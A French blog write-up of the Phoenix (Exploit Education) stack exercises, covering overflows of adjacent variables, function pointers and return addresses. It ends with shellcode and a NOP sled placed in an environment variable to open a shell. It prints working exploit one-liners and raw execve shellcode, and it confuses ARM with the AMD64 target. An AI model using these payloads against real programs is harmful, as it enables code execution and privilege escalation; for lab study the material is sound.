---
title: Exploitation de vulnérabilités binaires avec Phoenix
date: 2026-01-25
categories: [Security, Reverse, Pentest]
tags: [pentest, exploit, buffer-overflow, reverse, gdb, binary]
---

# Exploitation de vulnérabilités binaires avec Phoenix

Dans le cadre de mon apprentissage en sécurité offensive, je me suis exercé sur la VM [Phoenix d'Exploit Education](https://exploit.education/), une plateforme dédiée à l'apprentissage de l'exploitation de vulnérabilités binaires. Mon objectif était de travailler la recherche de vulnérabilités, en me concentrant principalement sur les buffer overflows, heap overflows et format strings.

## Pourquoi Phoenix ?

Phoenix propose une série d'exercices progressifs permettant de comprendre en profondeur le fonctionnement de la mémoire et les mécanismes d'exploitation. J'ai pu pratiquer :
- **Buffer overflow** : débordement de tampon pour écraser des variables adjacentes
- **Accès à des fonctions non prévues** : détournement du flux d'exécution
- **Shellcode** : injection et exécution de code arbitraire
- **Utilisation de GDB** : analyse et débogage de binaires

Ces compétences sont essentielles pour le reverse engineering et la recherche de vulnérabilités dans des programmes compilés.

## Environnement de travail

Après avoir téléchargé et installé la VM Phoenix (architecture AMD64), lancer : `./boot-exploit-education-phoenix-amd64.sh`. Se connecter : `ssh user@0.0.0.0 -p 2222` .

Le répertoire de travail `/opt/phoenix/amd64/` contient plusieurs catégories d'exercices :

```
stack-zero     stack-one      stack-two      stack-three
stack-four     stack-five     stack-six
format-zero    format-one     format-two     format-three    format-four
heap-zero      heap-one       heap-two       heap-three
net-zero       net-one        net-two
final-zero     final-one      final-two
```

Je vais détailler ma démarche sur les exercices de la catégorie **stack**, qui exploitent des vulnérabilités de buffer overflow.

---

## Stack-Zero : Premier débordement

### Analyse du code source

Le premier exercice présente une structure locale contenant un buffer de 64 octets et une variable `changeme` :

```c
struct {
    char buffer[64];
    volatile int changeme;
} locals;

locals.changeme = 0;
gets(locals.buffer);

if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
}
```

### Identification de la vulnérabilité

La vulnérabilité se trouve dans l'utilisation de `gets(locals.buffer)`, une fonction dangereuse qui **ne vérifie pas la taille du buffer**. Si nous écrivons plus de 64 octets, nous débordons sur la mémoire adjacente.

### Représentation mémoire

![](/images/phoenix/stack-zero.png)

La structure étant stockée de manière contiguë en mémoire, écrire au-delà de `buffer[64]` écrase directement la variable `changeme`.

### Exploitation

Pour modifier `changeme`, il suffit d'envoyer 65 caractères (ou plus) :

```bash
python2 -c "print(65 * 'a')" | ./stack-zero
```

**Résultat** : La variable `changeme` est modifiée, le challenge est validé.

---

## Stack-One : Contrôle précis de la valeur

### Évolution du challenge

Cette fois, il ne suffit pas de modifier `changeme`, il faut lui donner la valeur **exacte** `0x496c5962` :

```c
strcpy(locals.buffer, argv[1]);

if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
}
```

### Vulnérabilité

La fonction `strcpy()` ne vérifie pas la taille de la destination, permettant le même type de débordement.

### Représentation mémoire

![](/images/phoenix/stack-one.png)

### Considération de l'endianness

Les processeurs ARM utilisent le **little-endian** : les octets sont stockés dans l'ordre inverse. La valeur `0x496c5962` doit donc être écrite `\x62\x59\x6C\x49`.

### Exploitation

```bash
./stack-one $(python2 -c "print(64 * 'a' + '\x62\x59\x6C\x49')")
```

**Résultat** : `changeme` contient maintenant exactement `0x496c5962`.

---

## Stack-Two : Variables d'environnement

### Nouveau vecteur d'attaque

Le programme récupère la valeur depuis une variable d'environnement :

```c
ptr = getenv("ExploitEducation");
strcpy(locals.buffer, ptr);

if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
}
```

### Démarche d'exploitation

Même principe que précédemment, mais via une variable d'environnement :

```bash
export ExploitEducation=$(python2 -c "print(64 * 'a' + '\x0a\x09\x0a\x0d')")
./stack-two
```

**Résultat** : Validation du challenge en exploitant une source d'entrée différente.

---

## Stack-Three : Détournement de pointeur de fonction

### Objectif du challenge

Faire exécuter la fonction `complete_level()` en modifiant un pointeur de fonction :

```c
struct {
    char buffer[64];
    volatile int (*fp)();
} locals;

locals.fp = NULL;
gets(locals.buffer);

if (locals.fp) {
    locals.fp();  // Appel du pointeur de fonction
}
```

### Démarche de réflexion

Pour réussir, je dois :
1. Trouver l'adresse de `complete_level()` en mémoire
2. Écraser le pointeur `fp` avec cette adresse

### Analyse avec GDB

La VM Phoenix a l'**ASLR désactivé**, ce qui signifie que les adresses sont fixes. L'ASLR (Address Space Layout Randomization) est une protection introduite en 2005 sur Linux qui randomise les adresses mémoire.

```bash
gdb ./stack-three
(gdb) print complete_level
$1 = {<text variable, no debug info>} 0x4007c4 <complete_level>
```

### Exploitation

```bash
python2 -c "print(64 * 'a' + '\xc4\x07\x40')" | ./stack-three
```

**Résultat** : Le pointeur de fonction est redirigé vers `complete_level()`, qui s'exécute.


---

## Stack-Four : Détournement de l'adresse de retour

### Objectif du challenge

Faire exécuter la fonction `complete_level()` en modifiant l'adresse de retour de la fonction `start_level()` :

```c
void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}
```
### Démarche de réflexion

Pour réussir, je dois :
1. Trouver l'adresse de `complete_level()` en mémoire
2. Écraser l'adresse de retour dans le prologue de la fonction de `start_level()`

Représentation de la mémoire :

![](/images/phoenix/stack-four.png)
### Analyse avec GDB

On récupère l'adresse de comple_level()
```bash
(gdb) print complete_level
$1 = {<text variable, no debug info>} 0x40061d <complete_level>
``` 
### Exploitation
Il faut donc faire un overflow pour écraser la valeur intiale de l'adresse de retour.
Avec la représentation de la stack, nous pouvons remarquer qu'il faut écire de `rbp - 0x50` jusqu'à `rbp + 0x8` et écrire l'adresse.
Il faut donc écrire 0x58 puis l'adresse.

Solution : 
`python2 -c 'print(0x58 * b"a" + b"\x1d\x06\x40")' | ./stack-four`


---

## Stack-Five : Shell code

### Objectif du challenge

Éxécuter un shell à travers le programme.

### Démarche
#### Détournement adresse retour fonction:
Une des solutions serait de modifier l'adresse de retour d'une des fonctions pour faire pointer sur notre shellcode.
Voici la stack mémoire pour la fonction start_level():
![](/images/phoenix/stack-five.png)

Pour écraser l'adresse de retour et injecter l'adresse où sera situé notre shellcode, l'exploit sera :
```shell
python2 -c 'print(0x88 * b"a" + b"ADDRESSE")' | ./stack-five
```

#### Variable d'environnement:
Nous allons stocker le shellcode dans une variables d'environnement.
La variable d'environnement conteindra beaucoup d'instruction NOP pour aller directement au shellcode.
L'utilisatio nd'instruction NOP permet d'atérir sur notre shellcode même si l'adresse mémoire de la var d'env varie.

En hexa l'instruction NOP est `\x90`.
[Documentation instruction NOP](https://www.gladir.com/LEXIQUE/ASM/nop.htm)

On récupère un shellcode en ligne : 

`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05` est un shellcode (suite d'opration assembleur ouvrant un shell). [shellcode utilisé](https://shell-storm.org/shellcode/files/shellcode-806.html)

On initialise notre variable : 
```shell
export SHELLCODE=$(python2 -c 'print(10000 * b"\x90" + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")')
```

On récupère l'adresse de la variable : 
```shell
gdb ./stack-five
b main #breakpoint au début de main
r #run le program
print (void *)getenv("SHELLCODE") #affiche adresse de la var

(gdb) print (void *)getenv("SHELLCODE")
$1 = (void *) 0x7fffffffc780
``` 

#### Exploit
On à ajouter 10000 instruction NOP avant notre shellcode pour avoir plus de chance de tomber sur la bonne adresse dû au décalage en mémoire.

On ajoute 10000/2 à notre adresses : 
```python
>>> hex(0x7fffffffc780 + 5000)
'0x7fffffffdb08'
```

```bash
(python2 -c 'print(0x88 * b"a" + b"\x08\xdb\xff\xff\xff\x7f")';cat) | ./stack-five

whoami 
phoenix-amd64-stack-five
```
Nous avons maintenant les droit suid (élévation de privilège)


## Conclusion et perspectives

Ce travail sur Phoenix m'a permis de :
- **Comprendre en profondeur** la gestion de la mémoire en architecture ARM64
- **Maîtriser GDB** pour l'analyse de binaires et le débogage
- **Développer une méthodologie** d'identification et d'exploitation de vulnérabilités
- **Renforcer mes compétences** en reverse engineering

Les exercices suivants (stack-five, stack-six, format strings, heap exploitation) sont actuellement en cour de rédaction.

